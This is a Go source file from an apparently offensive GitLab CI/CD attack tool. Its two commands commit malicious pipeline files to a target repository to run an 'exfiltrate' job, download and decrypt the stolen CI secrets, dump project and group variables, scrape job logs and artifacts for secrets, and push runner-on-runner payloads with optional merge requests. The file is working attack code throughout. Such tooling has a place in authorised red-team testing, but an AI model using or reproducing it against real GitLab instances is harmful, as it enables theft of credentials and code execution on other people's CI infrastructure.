package cmd

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	rorpkg "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
)

// runAttackSecrets runs the secrets exfiltration attack mode.
func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	// parse tags
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	var pubkey string
	if strings.TrimSpace(atkPubkeyFile) != "" {
		b, err := os.ReadFile(strings.TrimSpace(atkPubkeyFile))
		if err != nil {
			return fmt.Errorf("read --pubkey-file: %w", err)
		}
		pubkey = string(b)
	}
	var privkeyPEM []byte
	if strings.TrimSpace(atkPrivkeyFile) != "" {
		b, err := os.ReadFile(strings.TrimSpace(atkPrivkeyFile))
		if err != nil {
			return fmt.Errorf("read --privkey-file: %w", err)
		}
		privkeyPEM = b
	}
	sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
	url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
	if err != nil {
		return err
	}
	// Give GitLab a moment to process the commit before querying pipelines.
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

	// Wait for the exfiltrate job, download artifacts, and decrypt -- default for artifact method.
	var (
		exfilSecrets map[string]string
		exfilJobID   int64
		exfilStatus  string
		pipelineID   int64
	)
	exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
	if !atkNoWait && (exfilMethod == "" || exfilMethod == "artifact") {
		// In JSON mode write progress to stderr so stdout stays clean JSON.
		progressW := cmd.OutOrStdout()
		if outputJSON {
			progressW = cmd.ErrOrStderr()
		}
		stdout := progressW
		renderInfo(stdout, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
		// WaitForExfilPipeline scans the 5 most recent pipelines on the branch each tick,
		// so it correctly finds the exfil pipeline even when the branch-creation pipeline
		// (triggered by EnsureBranch) appears first and contains no "exfiltrate" job.
		pipelineID, exfilJobID, exfilStatus, _ = attack.WaitForExfilPipeline(ctx, client, atkTarget, atkBranch, exfilJobNameUsed, 5*time.Second, atkWaitTimeout)
		if pipelineID > 0 {
			url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
		}
		switch exfilStatus {
		case "success":
			zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, atkTarget, exfilJobID)
			if zerr != nil {
				renderWarning(stdout, fmt.Sprintf("artifact download failed: %v", zerr))
			} else {
				sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
				if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
					exfilSecrets, err = secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
					if err != nil {
						renderWarning(stdout, fmt.Sprintf("decrypt failed: %v", err))
					}
				} else if len(sJSON) > 0 {
					_ = json.Unmarshal(sJSON, &exfilSecrets)
				}
			}
		case "":
			renderWarning(stdout, "exfiltrate job not found or timed out")
		default:
			renderWarning(stdout, fmt.Sprintf("exfiltrate job status: %s", exfilStatus))
		}
		if len(exfilSecrets) > 0 {
			renderExfilSecrets(stdout, exfilSecrets, atkAllVars)
			persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
		}
	}

	if outputJSON {
		out := secretsOutput{PipelineURL: url, JobID: exfilJobID, JobStatus: exfilStatus, ExfilSecrets: exfilSecrets}
		if atkWithProjVars {
			pv, err := secdump.ListProjectVariables(ctx, client, atkTarget, atkIncludeProtected)
			if err != nil {
				return fmt.Errorf("list project variables: %w", err)
			}
			out.ProjectVariables = pv
		}
		if atkWithGroupVars {
			gid := strings.TrimSpace(atkGroupID)
			if gid == "" {
				return fmt.Errorf("--group-vars requires --group-id (group numeric ID or full path)")
			}
			gv, err := secdump.ListGroupVariables(ctx, client, gid, atkIncludeProtected)
			if err != nil {
				return fmt.Errorf("list group variables: %w", err)
			}
			out.GroupVariables = gv
		}
		if atkLogs {
			finds, _ := secdump.ScrapeJobLogs(ctx, client, atkTarget, strings.TrimSpace(atkLogsRef), atkLogsMaxPipelines, atkLogsMaxJobs)
			if len(finds) > 0 {
				out.LogFindings = finds
			}
		}
		if atkArtifacts {
			afinds, _ := secdump.ScrapeArtifacts(ctx, client, atkTarget, strings.TrimSpace(atkArtifactsRef), atkArtifactsMaxPipelines, atkArtifactsMaxJobs, atkArtifactsMaxZipBytes, atkArtifactsMaxFileBytes)
			if len(afinds) > 0 {
				out.ArtifactFindings = afinds
			}
		}
		b, err := json.MarshalIndent(out, "", "  ")
		if err != nil {
			return fmt.Errorf("encode json: %w", err)
		}
		_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s", url))
	return nil
}

// runAttackCommitCI commits a .gitlab-ci.yml to the target repo and triggers a pipeline.
func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	// Validate CI content source: allow exactly one of --ci-yaml, --ci-file, --ci-stdin, or --payload
	sources := 0
	if strings.TrimSpace(atkCIInline) != "" {
		sources++
	}
	if strings.TrimSpace(atkCIFile) != "" {
		sources++
	}
	if atkCIStdin {
		sources++
	}
	if strings.TrimSpace(atkPayload) != "" {
		sources++
	}
	if sources != 1 {
		return fmt.Errorf("provide exactly one CI content source: --ci-yaml, --ci-file, --ci-stdin, or --payload")
	}
	// Auto-select runner tags for ror payload if not provided
	if strings.TrimSpace(atkPayload) != "" {
		lp := strings.ToLower(strings.TrimSpace(atkPayload))
		if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
			tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
			if derr == nil {
				if strings.TrimSpace(atkExecutor) != "" {
					tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
				}
				if len(tags) > 0 {
					atkTags = strings.Join(tags, ",")
				}
			}
		}
	}
	var ci string
	var err error
	if strings.TrimSpace(atkPayload) != "" {
		ci, err = renderPayload()
	} else {
		ci, err = loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
	}
	if err != nil {
		return err
	}
	if strings.TrimSpace(ci) == "" {
		return errors.New("empty CI content")
	}

	// Deconflict strategy for branch staging
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if err != nil {
		return err
	}
	att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	url, err := att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
	if err != nil {
		return err
	}
	// Snapshot the stale pipeline (from branch creation) so we can
	// wait for the NEW pipeline triggered by the CI file commit.
	stalePipelineID, _ := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 0, 500*time.Millisecond, 5*time.Second)
	pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, stalePipelineID, 2*time.Second, 30*time.Second)
	if waitErr == nil && pipelineID > 0 {
		url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
	} else if stalePipelineID > 0 {
		url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, stalePipelineID)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

	// Optionally create a merge request after committing CI
	var mrURL string
	var mrIID int64
	if atkCreateMR {
		realAtt := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
		mr, mrErr := realAtt.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
		if mrErr != nil {
			return fmt.Errorf("create merge request: %w", mrErr)
		}
		mrURL = mr.WebURL
		mrIID = mr.IID
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
	}

	if outputJSON {
		out := struct {
			PipelineURL     string `json:"pipeline_url"`
			Branch          string `json:"branch"`
			PipelineID      int64  `json:"pipeline_id"`
			MergeRequestURL string `json:"merge_request_url,omitempty"`
			MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
		}{
			PipelineURL:     url,
			Branch:          finalBranch,
			PipelineID:      pipelineID,
			MergeRequestURL: mrURL,
			MergeRequestIID: mrIID,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s (branch %s)", url, finalBranch))
	if mrURL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
	}
	return nil
}
